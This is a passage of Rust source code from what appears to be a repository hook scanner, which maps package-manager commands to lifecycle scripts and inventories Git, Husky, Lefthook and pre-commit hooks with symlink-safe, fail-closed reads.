                    "install" | "i" | "in" | "ins" | "inst" | "insta" | "instal" | "isnt" | "isnta"
                    | "isntal" | "isntall" | "add" | "ci" | "clean-install" | "ic"
                    | "install-clean" | "isntall-clean",
                ) => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: INSTALL_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some(
                    "install-test" | "it" | "install-ci-test" | "cit" | "clean-install-test"
                    | "sit",
                ) => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: INSTALL_TEST_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("rebuild" | "rb") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: REBUILD_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("pack") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: PACK_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("publish" | "pub") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: PUBLISH_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            "yarn" => match sub {
                // No subcommand also installs.
                None | Some("install") | Some("add") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: INSTALL_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("pack") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: PACK_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("publish" | "npm-publish") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: PUBLISH_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            "pnpm" => match sub {
                None | Some("install") | Some("i") | Some("add") | Some("ci") => {
                    Some(LeaderTarget {
                        git_events: &[],
                        package_scripts: INSTALL_LIFECYCLE_SCRIPTS,
                        direnv: false,
                        invalidate_cache: false,
                    })
                }
                Some("rebuild" | "rb") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: REBUILD_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("pack") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: PACK_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("publish" | "pub") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: PUBLISH_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            "bun" => match sub {
                Some("install") | Some("i") | Some("add") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: INSTALL_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                Some("publish") => Some(LeaderTarget {
                    git_events: &[],
                    package_scripts: PUBLISH_LIFECYCLE_SCRIPTS,
                    direnv: false,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            "direnv" => match sub {
                Some("allow") | Some("reload") | Some("export") | Some("exec") => {
                    Some(LeaderTarget {
                        git_events: &[],
                        package_scripts: &[],
                        direnv: true,
                        invalidate_cache: false,
                    })
                }
                _ => None,
            },
            _ => None,
        }
    }

    /// `true` when `entry` is one of the surfaces this leader triggers.
    fn matches(&self, entry: &RepoHookEntry) -> bool {
        match entry.provider {
            HookProvider::PackageJson => {
                !self.package_scripts.is_empty()
                    && (entry.name == "package.json"
                        || self.package_scripts.contains(&entry.name.as_str()))
            }
            HookProvider::Direnv => self.direnv,
            HookProvider::Git
            | HookProvider::Husky
            | HookProvider::Lefthook
            | HookProvider::PreCommit => {
                // Match by git event; fall back to matching the hook NAME when we
                // couldn't tag it with a git_event.
                !self.git_events.is_empty()
                    && (entry
                        .git_events
                        .iter()
                        .any(|e| self.git_events.contains(&e.as_str()))
                        || self.git_events.contains(&entry.name.as_str()))
            }
            // Automation + mise/asdf are never triggered by a pkg/git/direnv command.
            HookProvider::Makefile
            | HookProvider::Justfile
            | HookProvider::Taskfile
            | HookProvider::Mise => false,
        }
    }
}

/// The basename of a leader token (`/usr/bin/git` → `git`, `git` → `git`).
fn leader_basename(leader: &str) -> &str {
    let leader = leader.trim_matches(|c: char| c == '"' || c == '\'');
    leader
        .rsplit(['/', '\\'])
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or(leader)
}

#[derive(Debug, Clone)]
struct CurrentGitHookLocation {
    directory: PathBuf,
    containment_root: PathBuf,
}

/// Resolve the hook directory Git will actually use, including linked-worktree
/// common hooks and repository-local `core.hooksPath`. A custom path is accepted
/// only when it stays beneath the worktree or the descriptor-proven common Git
/// directory; external custom paths fail closed instead of becoming an arbitrary
/// file-disclosure surface.
fn current_git_hook_location(repo_root: &Path) -> Result<Option<CurrentGitHookLocation>, String> {
    let git_marker = repo_root.join(".git");
    let marker_metadata = match std::fs::symlink_metadata(&git_marker) {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(_) => return Err("repository Git metadata cannot be inspected".to_string()),
    };
    if marker_metadata.file_type().is_symlink() {
        return Err("repository .git metadata is a symlink".to_string());
    }
    if marker_metadata.is_dir()
        && !git_marker.join("HEAD").exists()
        && !git_marker.join("config").exists()
    {
        // A directory containing only `.git/hooks` is an inert inventory
        // fixture/non-repository and cannot execute Git lifecycle hooks.
        return Ok(Some(CurrentGitHookLocation {
            directory: git_marker.join("hooks"),
            containment_root: repo_root.to_path_buf(),
        }));
    }

    let query_path = |flag: &str, tail: Option<&str>| -> Result<PathBuf, String> {
        let mut args = vec![
            "rev-parse".to_string(),
            "--path-format=absolute".to_string(),
            flag.to_string(),
        ];
        if let Some(tail) = tail {
            args.push(tail.to_string());
        }
        let output = run_trusted_git_for_hook_location(repo_root, &args, 16 * 1024)
            .map_err(str::to_string)?;
        if !output.success {
            return Err("trusted Git could not resolve its effective hook path".to_string());
        }
        let text = std::str::from_utf8(&output.stdout)
            .map_err(|_| "Git hook path is not valid UTF-8".to_string())?;
        let value = text.trim_end_matches(['\r', '\n']);
        if value.is_empty()
            || value.contains(['\r', '\n', '\0'])
            || !Path::new(value).is_absolute()
            || Path::new(value)
                .components()
                .any(|component| matches!(component, std::path::Component::ParentDir))
        {
            return Err("Git returned an ambiguous effective hook path".to_string());
        }
        Ok(PathBuf::from(value))
    };

    // Real repositories carry HEAD/config. Any resolver failure from here is
    // ambiguous and remains fail-closed; there is no conventional-path fallback.
    let common_dir = query_path("--git-common-dir", None)?;
    let common_dir = common_dir
        .canonicalize()
        .map_err(|_| "Git common directory cannot be identity-bound".to_string())?;
    if !common_dir.is_dir() {
        return Err("Git common directory is not a directory".to_string());
    }
    let effective = query_path("--git-path", Some("hooks"))?;
    let default = common_dir.join("hooks");
    let worktree = repo_root
        .canonicalize()
        .map_err(|_| "repository root cannot be identity-bound".to_string())?;

    let canonical_effective = effective.canonicalize().ok();
    let canonical_default = default.canonicalize().ok();
    let is_default = effective == default
        || canonical_effective
            .as_ref()
            .zip(canonical_default.as_ref())
            .is_some_and(|(effective, default)| effective == default);
    if is_default {
        if canonical_effective
            .as_deref()
            .is_some_and(|path| !path.starts_with(&common_dir))
        {
            return Err("default Git hook directory escapes the common Git directory".to_string());
        }
        return Ok(Some(CurrentGitHookLocation {
            directory: canonical_effective.unwrap_or(default),
            containment_root: if common_dir.starts_with(&worktree) {
                worktree
            } else {
                common_dir
            },
        }));
    }

    for containment_root in [&worktree, &common_dir] {
        let contained = canonical_effective
            .as_deref()
            .map(|path| path.starts_with(containment_root))
            .unwrap_or_else(|| effective.starts_with(containment_root));
        if contained {
            return Ok(Some(CurrentGitHookLocation {
                directory: canonical_effective
                    .clone()
                    .unwrap_or_else(|| effective.clone()),
                containment_root: containment_root.to_path_buf(),
            }));
        }
    }

    Err(
        "repository core.hooksPath resolves outside the worktree and common Git directory"
            .to_string(),
    )
}

/// Retained as a compatibility API for callers that previously invalidated the
/// hook cache. Executable lifecycle surfaces are deliberately uncached now, so
/// there is no state to invalidate.
pub fn invalidate_cache_for(_repo_root: &Path) {}

/// Enumerate every hook / automation surface under `repo_root`.
fn collect_all(repo_root: &Path) -> Vec<RepoHookEntry> {
    let mut entries = Vec::new();

    collect_git_hooks(repo_root, &mut entries);
    collect_husky(repo_root, &mut entries);
    collect_lefthook(repo_root, &mut entries);
    collect_pre_commit(repo_root, &mut entries);
    collect_package_json(repo_root, &mut entries);
    collect_direnv(repo_root, &mut entries);
    collect_mise(repo_root, &mut entries);
    collect_automation(repo_root, &mut entries);

    entries
}

/// Read any non-`.sample` file in `.git/hooks` (git's shipped samples are inert).
fn collect_git_hooks(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let location = match current_git_hook_location(repo_root) {
        Ok(Some(location)) => location,
        Ok(None) => return,
        Err(reason) => {
            push_unreadable_entry(
                out,
                ".git/hooks".to_string(),
                HookProvider::Git,
                repo_root.join(".git"),
                all_git_events(),
                &reason,
            );
            return;
        }
    };
    let dir = location.directory;
    let rd = match std::fs::read_dir(&dir) {
        Ok(rd) => rd,
        Err(error)
            if error.kind() == std::io::ErrorKind::NotFound
                && matches!(
                    std::fs::symlink_metadata(&dir),
                    Err(metadata_error)
                        if metadata_error.kind() == std::io::ErrorKind::NotFound
                ) =>
        {
            return;
        }
        Err(_) => {
            push_unreadable_entry(
                out,
                ".git/hooks".to_string(),
                HookProvider::Git,
                dir,
                all_git_events(),
                "hook directory cannot be enumerated safely",
            );
            return;
        }
    };
    for result in rd {
        let entry = match result {
            Ok(entry) => entry,
            Err(_) => {
                push_unreadable_entry(
                    out,
                    ".git/hooks/<unknown>".to_string(),
                    HookProvider::Git,
                    dir.clone(),
                    all_git_events(),
                    "hook directory contains an entry that cannot be inspected",
                );
                continue;
            }
        };
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            push_unreadable_entry(
                out,
                ".git/hooks/<non-UTF-8-name>".to_string(),
                HookProvider::Git,
                path,
                all_git_events(),
                "hook name is not valid UTF-8",
            );
            continue;
        };
        // Skip git's shipped samples — they are inert until renamed.
        if name.ends_with(".sample") {
            continue;
        }
        // Skip real subdirectories WITHOUT following symlinks (`entry.file_type()`
        // does not traverse). A symlink entry is deliberately NOT skipped here:
        // `push_hook_file` either inspects a descriptor-proven contained regular
        // target or surfaces the link as High and uninspectable.
        if entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        push_hook_file(
            out,
            &location.containment_root,
            name.to_string(),
            HookProvider::Git,
            path.clone(),
            vec![name.to_string()],
        );
    }
}

/// husky v5+ stores one script per git-event under `.husky/`. `.husky/_/` is its
/// bootstrap dir — skip it.
fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let dir = repo_root.join(".husky");
    let rd = match std::fs::read_dir(&dir) {
        Ok(rd) => rd,
        Err(error)
            if error.kind() == std::io::ErrorKind::NotFound
                && matches!(
                    std::fs::symlink_metadata(&dir),
                    Err(metadata_error)
                        if metadata_error.kind() == std::io::ErrorKind::NotFound
                ) =>
        {
            return;
        }
        Err(_) => {
            push_unreadable_entry(
                out,
                ".husky".to_string(),
                HookProvider::Husky,
                dir,
                all_git_events(),
                "Husky hook directory cannot be enumerated safely",
            );
            return;
        }
    };
    for result in rd {
        let entry = match result {
            Ok(entry) => entry,
            Err(_) => {
                push_unreadable_entry(
                    out,
                    ".husky/<unknown>".to_string(),
                    HookProvider::Husky,
                    dir.clone(),
                    all_git_events(),
                    "Husky hook directory contains an entry that cannot be inspected",
                );
                continue;
            }
        };
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            push_unreadable_entry(
                out,
                ".husky/<non-UTF-8-name>".to_string(),
                HookProvider::Husky,
                path,
                all_git_events(),
                "Husky hook name is not valid UTF-8",
            );
            continue;
        };
        if name.starts_with('_') || name.starts_with('.') {
            continue; // .husky/_/, .gitignore, etc.
        }
        // Skip real subdirectories WITHOUT following symlinks; a symlink entry
        // flows to `push_hook_file` for repository-anchored inspection (see
        // `collect_git_hooks`).
        if entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        push_hook_file(
            out,
            repo_root,
            name.to_string(),
            HookProvider::Husky,
            path.clone(),
            vec![name.to_string()],
        );
    }
}

/// Read a git/husky hook FILE and push its entry. A descriptor-proven contained
/// symlink to a regular file is classified without disclosing the target body.
/// Every other unreadable state (permissions, escaping/dangling/unsupported link,
/// oversize, or non-UTF-8) is NOT silently dropped — a deliberately-unreadable hook
/// is the one a scan must not miss — and surfaces as a High fail-closed finding. An
/// absent file produces nothing (the `read_dir` walk that found it means this
/// normally only sees blocked, never absent).
fn push_hook_file(
    out: &mut Vec<RepoHookEntry>,
    repo_root: &Path,
    name: String,
    provider: HookProvider,
    path: PathBuf,
    git_events: Vec<String>,
) {
    if path
        .symlink_metadata()
        .map(|metadata| metadata.file_type().is_symlink())
        .unwrap_or(false)
    {
        #[cfg(unix)]
        match read_contained_hook_symlink(&path, repo_root, MAX_HOOK_BODY_SIZE) {
            Ok(bytes) => match String::from_utf8(bytes) {
                Ok(body) => {
                    let location = path.display().to_string();
                    let findings = classify_body(&name, provider, &location, &body);
                    out.push(RepoHookEntry {
                        name,
                        category: provider.category(),
                        provider,
                        source_path: path,
                        // Classify from the descriptor-bound bytes but do not
                        // expose a link target through `hooks explain`.
                        body: String::new(),
                        git_events,
                        findings,
                    });
                }
                Err(_) => push_unreadable_entry(
                    out,
                    name,
                    provider,
                    path,
                    git_events,
                    "contained symlink target is not valid UTF-8",
                ),
            },
            Err(reason) => push_unreadable_entry(out, name, provider, path, git_events, &reason),
        }
        #[cfg(not(unix))]
        push_unreadable_entry(
            out,
            name,
            provider,
            path,
            git_events,
            "symlink target cannot be inspected with a repository-anchored no-follow walk on this platform",
        );
        return;
    }

    match read_text(&path, repo_root) {
        ReadOutcome::Text(body) => push_entry(out, name, provider, path, body, git_events),
        ReadOutcome::Unreadable(reason) => {
            push_unreadable_entry(out, name, provider, path, git_events, &reason)
        }
        ReadOutcome::Absent => {}
    }
}

/// Resolve a final hook symlink without ever asking the kernel to follow it.
/// Each captured target component is reopened from an already-open repository
/// directory descriptor with `O_NOFOLLOW`; `..`, absolute escape, intermediate
/// symlinks, non-regular targets, and oversized bodies fail closed. A path swap
/// can therefore change which *contained* file is inspected, but cannot redirect
/// this read outside the repository or onto a special file.
#[cfg(unix)]
fn read_contained_hook_symlink(path: &Path, repo_root: &Path, cap: u64) -> Result<Vec<u8>, String> {
    use std::io::Read as _;
    use std::os::fd::{AsRawFd as _, FromRawFd as _};
    use std::os::unix::ffi::{OsStrExt as _, OsStringExt as _};
    use std::os::unix::fs::OpenOptionsExt as _;
    use std::path::Component;

    fn component_cstring(component: &std::ffi::OsStr) -> Result<std::ffi::CString, String> {
        std::ffi::CString::new(component.as_bytes())
            .map_err(|_| "hook path contains a NUL byte".to_string())
    }

    fn open_dir_at(
        parent: &std::fs::File,
        name: &std::ffi::OsStr,
    ) -> Result<std::fs::File, String> {
        let name = component_cstring(name)?;
        let fd = unsafe {
            libc::openat(
                parent.as_raw_fd(),
                name.as_ptr(),
                libc::O_RDONLY | libc::O_DIRECTORY | libc::O_NOFOLLOW | libc::O_CLOEXEC,
            )
        };
        if fd < 0 {
            return Err("hook target contains a symlinked or unreadable directory".to_string());
        }
        // SAFETY: openat returned a fresh owned descriptor.
        Ok(unsafe { std::fs::File::from_raw_fd(fd) })
    }

    fn open_parent(root: &std::fs::File, components: &[OsString]) -> Result<std::fs::File, String> {
        let mut current = root
            .try_clone()
            .map_err(|_| "repository directory descriptor could not be cloned".to_string())?;
        for component in components {
            current = open_dir_at(&current, component)?;
        }
        Ok(current)
    }

    fn read_link_at(parent: &std::fs::File, name: &std::ffi::OsStr) -> Result<PathBuf, String> {
        let name = component_cstring(name)?;
        let mut capacity = 256usize;
        loop {
            let mut buffer = vec![0u8; capacity];
            let length = unsafe {
                libc::readlinkat(
                    parent.as_raw_fd(),
                    name.as_ptr(),
                    buffer.as_mut_ptr().cast(),
                    buffer.len(),
                )
            };
            if length < 0 {
                return Err("hook symlink target could not be read safely".to_string());
            }
            let length = length as usize;
            if length < buffer.len() {
                buffer.truncate(length);
                return Ok(PathBuf::from(OsString::from_vec(buffer)));
            }
            capacity = capacity
                .checked_mul(2)
                .filter(|size| *size <= 64 * 1024)
                .ok_or_else(|| "hook symlink target exceeds the path limit".to_string())?;
        }
    }

    fn normalized_target(
        target: &Path,
        parent_components: &[OsString],
        repo_root: &Path,
    ) -> Result<Vec<OsString>, String> {
        let (mut components, target) = if target.is_absolute() {
            let relative = target
                .strip_prefix(repo_root)
                .map_err(|_| "hook symlink escapes the repository root".to_string())?;
            (Vec::new(), relative)
        } else {
            (parent_components.to_vec(), target)
        };
        for component in target.components() {
            match component {
                Component::CurDir => {}
                Component::Normal(value) => components.push(value.to_os_string()),
                Component::ParentDir => {
                    components
                        .pop()
                        .ok_or_else(|| "hook symlink escapes the repository root".to_string())?;
                }
                Component::RootDir | Component::Prefix(_) => {
                    return Err("hook symlink target has an unsupported root".to_string());
                }
            }
        }
        if components.is_empty() {
            return Err("hook symlink target is empty".to_string());
        }
        Ok(components)
    }

    let relative = path
        .strip_prefix(repo_root)
        .map_err(|_| "hook path is not beneath the repository root".to_string())?;
    let mut components = Vec::new();
    for component in relative.components() {
        match component {
            Component::CurDir => {}
            Component::Normal(value) => components.push(value.to_os_string()),
            _ => return Err("hook path contains an escaping component".to_string()),
        }
    }
    if components.is_empty() {
        return Err("hook path is empty".to_string());
    }

    let root = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_DIRECTORY | libc::O_NOFOLLOW | libc::O_CLOEXEC)
        .open(repo_root)
        .map_err(|_| "repository root cannot be opened without following links".to_string())?;

    for _ in 0..16 {
        let (leaf, parent_components) = components
            .split_last()
            .ok_or_else(|| "hook target is empty".to_string())?;
        let parent = open_parent(&root, parent_components)?;
        let leaf_c = component_cstring(leaf)?;
        let fd = unsafe {
            libc::openat(
                parent.as_raw_fd(),
                leaf_c.as_ptr(),
                libc::O_RDONLY | libc::O_NOFOLLOW | libc::O_NONBLOCK | libc::O_CLOEXEC,
            )
        };
        if fd < 0 {
            let error = std::io::Error::last_os_error();
            if error.raw_os_error() == Some(libc::ELOOP) {
                let target = read_link_at(&parent, leaf)?;
                components = normalized_target(&target, parent_components, repo_root)?;
                continue;
            }
            return Err("hook target could not be opened without following links".to_string());
        }
        // SAFETY: openat returned a fresh owned descriptor.
        let file = unsafe { std::fs::File::from_raw_fd(fd) };
        let metadata = file
            .metadata()
            .map_err(|_| "hook target metadata could not be inspected".to_string())?;
        if !metadata.is_file() {
            return Err("hook symlink target is not a regular file".to_string());
        }
        if metadata.len() > cap {
            return Err("hook symlink target exceeds the body size cap".to_string());
        }
        let mut body = Vec::new();
        file.take(cap.saturating_add(1))
            .read_to_end(&mut body)
            .map_err(|_| "hook symlink target could not be read".to_string())?;
        if body.len() as u64 > cap {
            return Err("hook symlink target exceeds the body size cap".to_string());
        }
        return Ok(body);
    }
    Err("hook symlink chain exceeds the inspection limit".to_string())
}

fn all_git_events() -> Vec<String> {
    GIT_EVENTS
        .iter()
        .map(|event| (*event).to_string())
        .collect()
}

/// Push a High fail-closed "present but uninspectable" placeholder for a surface
/// that exists but could not be read into a classifiable body. Shared by every
/// collector so a blocked surface (symlinked / oversized / unreadable) is INVENTORIED
/// and blocked rather than silently dropped — dropping it would let an attacker hide
/// an auto-run hook behind a symlink and make a leader-targeted scan come back CLEAN.
fn push_unreadable_entry(
    out: &mut Vec<RepoHookEntry>,
    name: String,
    provider: HookProvider,
    path: PathBuf,
    git_events: Vec<String>,
    reason: &str,
) {
    let location = path.display().to_string();
    let finding = uninspectable_finding(&name, provider, &location, reason);
    out.push(RepoHookEntry {
        name,
        category: provider.category(),
        provider,
        source_path: path,
        body: String::new(),
        git_events,
        findings: vec![finding],
    });
}

fn uninspectable_finding(
    name: &str,
    provider: HookProvider,
    location: &str,
    reason: &str,
) -> RepoHookFinding {
    RepoHookFinding {
        rule_id: RuleId::AnalysisIncomplete,
        severity: Severity::High,
        name: name.to_string(),
        provider,
        location: location.to_string(),
        detail: format!(
            "present but uninspectable ({reason}); automatic execution is blocked until the surface can be reviewed"
        ),
    }
}

/// Parse every Lefthook configuration surface with serde_yaml and inventory one
/// body per configured Git event. Quoted/flow keys and YAML aliases are handled
/// by the YAML parser. Configuration composition (`extends` / `remotes`) is not
/// followed here because doing so could require an unbounded or remote read; a
/// present composition directive therefore emits a High fail-closed placeholder
/// instead of silently approving only the local fragment.
fn collect_lefthook(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    for rel in LEFTHOOK_CONFIG_SURFACES {
        let path = repo_root.join(rel);
        let contents = match read_text(&path, repo_root) {
            ReadOutcome::Text(c) => c,
            // Present but blocked: inventory the config file itself so a symlinked /
            // oversized lefthook config can't suppress its events from the scan.
            ReadOutcome::Unreadable(reason) => {
                push_unreadable_entry(
                    out,
                    (*rel).to_string(),
                    HookProvider::Lefthook,
                    path,
                    // A readable lefthook config could hook ANY git event; since we
                    // can't parse this blocked one, tag the placeholder with all of
                    // them so a git-leader scan still matches it (LeaderTarget::matches
                    // triggers Lefthook entries only via git_events / name).
                    all_git_events(),
                    &reason,
                );
                continue;
            }
            ReadOutcome::Absent => continue,
        };
        match lefthook_events(&contents) {
            Ok(events) => {
                for (event, body) in events {
                    push_entry(
                        out,
                        event.clone(),
                        HookProvider::Lefthook,
                        path.clone(),
                        body,
                        vec![event],
                    );
                }
            }
            Err(reason) => push_unreadable_entry(
                out,
                (*rel).to_string(),
                HookProvider::Lefthook,
                path,
                all_git_events(),
                &reason,
            ),
        }
    }
}

/// Extract shell commands from a strictly parsed Lefthook document. Returning
/// `Err` is security-significant: callers inventory the file as uninspectable
/// High rather than treating an unsupported-but-executable YAML form as empty.
fn lefthook_events(contents: &str) -> Result<Vec<(String, String)>, String> {
    let mut document = serde_yaml::from_str::<serde_yaml::Value>(contents)
        .map_err(|_| "Lefthook configuration is not valid YAML".to_string())?;
    document
        .apply_merge()
        .map_err(|_| "Lefthook YAML merge keys could not be applied safely".to_string())?;
    let serde_yaml::Value::Mapping(root) = document else {
        return Err("Lefthook configuration root is not a mapping".to_string());
    };

    for composition_key in ["extends", "remotes", "rc", "templates", "lefthook", "setup"] {
        if root.iter().any(|(key, value)| {
            key.as_str() == Some(composition_key) && !yaml_value_is_empty(value)
        }) {
            return Err(format!(
                "Lefthook `{composition_key}` execution/composition cannot be completely inspected from this configuration"
            ));
        }
    }

    let mut out = Vec::new();
    for (key, value) in root {
        let Some(event) = key.as_str() else {
            return Err("Lefthook configuration contains a non-string top-level key".to_string());
        };
        if !GIT_EVENTS.contains(&event) {
            continue;
        }
        if matches!(
            &value,
            serde_yaml::Value::Bool(false) | serde_yaml::Value::Null
        ) {
            continue;
        }
        if matches!(
            &value,
            serde_yaml::Value::Bool(true) | serde_yaml::Value::Number(_)
        ) {
            return Err(format!(
                "Lefthook event `{event}` has an unsupported scalar configuration"
            ));
        }

        let mut commands = Vec::new();
        collect_lefthook_commands(&value, &mut commands, 0)?;
        out.push((event.to_string(), commands.join("\n")));
    }
    Ok(out)
}

fn yaml_value_is_empty(value: &serde_yaml::Value) -> bool {
    matches!(value, serde_yaml::Value::Null)
        || matches!(value, serde_yaml::Value::Sequence(values) if values.is_empty())
        || matches!(value, serde_yaml::Value::Mapping(values) if values.is_empty())
}

fn collect_lefthook_commands(
    value: &serde_yaml::Value,
    commands: &mut Vec<String>,
    depth: usize,
) -> Result<(), String> {
    if depth >= 64 {
        return Err("Lefthook YAML nesting exceeds the inspection limit".to_string());
    }
    match value {
        serde_yaml::Value::String(command) => {
            if !command.trim().is_empty() {
                commands.push(command.clone());
            }
        }
        serde_yaml::Value::Sequence(values) => {
            for value in values {
                collect_lefthook_commands(value, commands, depth + 1)?;
            }
        }
        serde_yaml::Value::Mapping(mapping) => {
            for (key, value) in mapping {
                let Some(key) = key.as_str() else {
                    return Err(
                        "Lefthook event contains a non-string configuration key".to_string()
                    );
                };
                match key {
                    // These schema fields contain shell commands. `run` and
                    // `runner` are scalar in Lefthook, while command/job/group
                    // collections recurse into their structured entries. The
                    // YAML merge key (`<<`) is also traversed so aliases cannot
                    // hide an executable command.
                    "run" | "runner" | "files" => match value {
                        serde_yaml::Value::String(command) => {
                            if !command.trim().is_empty() {
                                commands.push(command.clone());
                            }
                        }
                        _ => {
                            return Err(format!("Lefthook `{key}` command is not a string"));
                        }
                    },
                    "script" | "scripts" | "rc" | "templates" | "lefthook" | "setup"
                        if !yaml_value_is_empty(value) =>
                    {
                        return Err(
                            format!("Lefthook `{key}` executes or composes external command state that is not represented in this configuration")
                        );
                    }
                    "script" | "scripts" | "rc" | "templates" | "lefthook" | "setup" => {}
                    "commands" | "jobs" | "groups" | "piped" | "parallel" | "<<" => {
                        collect_lefthook_commands(value, commands, depth + 1)?;
                    }
                    // Metadata may itself wrap a supported collection in newer
                    // schema versions. Recurse through containers to find named
                    // execution fields, but do not treat metadata scalar values
                    // (glob patterns, tags, skip expressions) as commands.
                    _ => match value {
                        serde_yaml::Value::Mapping(_)
                        | serde_yaml::Value::Sequence(_)
                        | serde_yaml::Value::Tagged(_) => {
                            collect_lefthook_commands(value, commands, depth + 1)?;
                        }
                        _ => {}
                    },
                }
            }
        }
        serde_yaml::Value::Tagged(tagged) => {
            collect_lefthook_commands(&tagged.value, commands, depth + 1)?;
        }
        serde_yaml::Value::Null | serde_yaml::Value::Bool(_) | serde_yaml::Value::Number(_) => {}
    }
    Ok(())
}

const PRE_COMMIT_GIT_STAGES: &[&str] = &[
    "pre-commit",
    "pre-merge-commit",
    "pre-push",
    "pre-rebase",
    "prepare-commit-msg",
    "commit-msg",
    "post-commit",
    "post-checkout",
    "post-merge",
    "post-rewrite",
];

/// Classify each pre-commit framework hook under the Git stages where it can
/// execute. Per-hook `stages` overrides `default_stages`; absent stage metadata
/// means every supported Git stage, matching pre-commit's default semantics.
fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    for rel in [".pre-commit-config.yaml", ".pre-commit-config.yml"] {
        let path = repo_root.join(rel);
        let contents = match read_text(&path, repo_root) {
            ReadOutcome::Text(c) => c,
            // Present but blocked: it may configure any supported stage.
            ReadOutcome::Unreadable(reason) => {
                push_unreadable_entry(
                    out,
                    rel.to_string(),
                    HookProvider::PreCommit,
                    path,
                    PRE_COMMIT_GIT_STAGES
                        .iter()
                        .map(|stage| (*stage).to_string())
                        .collect(),
                    &reason,
                );
                continue;
            }
            ReadOutcome::Absent => continue,
        };
        match pre_commit_entries(&contents) {
            Ok(entries) => {
                for (event, body) in entries {
                    push_entry(
                        out,
                        event.clone(),
                        HookProvider::PreCommit,
                        path.clone(),
                        body,
                        vec![event],
                    );
                }
            }
            Err(reason) => push_unreadable_entry(
                out,
                rel.to_string(),
                HookProvider::PreCommit,
                path,
                PRE_COMMIT_GIT_STAGES
                    .iter()
                    .map(|stage| (*stage).to_string())
                    .collect(),
                &reason,
            ),
        }
    }
}

fn pre_commit_entries(contents: &str) -> Result<Vec<(String, String)>, String> {
    let mut document = serde_yaml::from_str::<serde_yaml::Value>(contents)
        .map_err(|_| "pre-commit configuration is not valid YAML".to_string())?;
    document
        .apply_merge()
        .map_err(|_| "pre-commit YAML merge keys could not be applied safely".to_string())?;
    let serde_yaml::Value::Mapping(root) = document else {
        return Err("pre-commit configuration root is not a mapping".to_string());
    };

    fn value_for_key<'a>(
        mapping: &'a serde_yaml::Mapping,
        wanted: &str,
    ) -> Option<&'a serde_yaml::Value> {
        mapping
            .iter()
            .find_map(|(key, value)| (key.as_str() == Some(wanted)).then_some(value))
    }

    fn normalize_stage(stage: &str) -> Result<Option<&'static str>, String> {
        match stage {
            // Legacy pre-commit stage names map to their modern Git hook names.
            "commit" => Ok(Some("pre-commit")),
            "merge-commit" => Ok(Some("pre-merge-commit")),
            "push" => Ok(Some("pre-push")),
            "manual" => Ok(None),
            stage if PRE_COMMIT_GIT_STAGES.contains(&stage) => PRE_COMMIT_GIT_STAGES
                .iter()
                .find(|known| **known == stage)
                .copied()
                .map(Some)
                .ok_or_else(|| "pre-commit stage could not be normalized".to_string()),
            _ => Err(format!(
                "pre-commit configuration names unsupported stage `{stage}`"
            )),
        }
    }

    fn parse_stages(value: &serde_yaml::Value) -> Result<Vec<String>, String> {
        let serde_yaml::Value::Sequence(stages) = value else {
            return Err("pre-commit stages must be a sequence".to_string());
        };
        let mut normalized = Vec::new();
        for stage in stages {
            let Some(stage) = stage.as_str() else {
                return Err("pre-commit stage is not a string".to_string());
            };
            if let Some(stage) = normalize_stage(stage)? {
                if !normalized.iter().any(|existing| existing == stage) {
                    normalized.push(stage.to_string());
                }
            }
        }
        Ok(normalized)
    }

    let default_stages = match value_for_key(&root, "default_stages") {
        Some(value) => parse_stages(value)?,
        None => PRE_COMMIT_GIT_STAGES
            .iter()
            .map(|stage| (*stage).to_string())
            .collect(),
    };
    let Some(repos) = value_for_key(&root, "repos") else {
        return Ok(Vec::new());
    };
    let serde_yaml::Value::Sequence(repos) = repos else {
        return Err("pre-commit `repos` is not a sequence".to_string());
    };

    let mut entries = Vec::new();
    for repo in repos {
        let serde_yaml::Value::Mapping(repo) = repo else {
            return Err("pre-commit repository entry is not a mapping".to_string());
        };
        let repo_name = value_for_key(repo, "repo")
            .and_then(serde_yaml::Value::as_str)
            .ok_or_else(|| "pre-commit repository name is missing or not a string".to_string())?;
        let remote = repo_name
            .starts_with("http://")
            .then_some(repo_name)
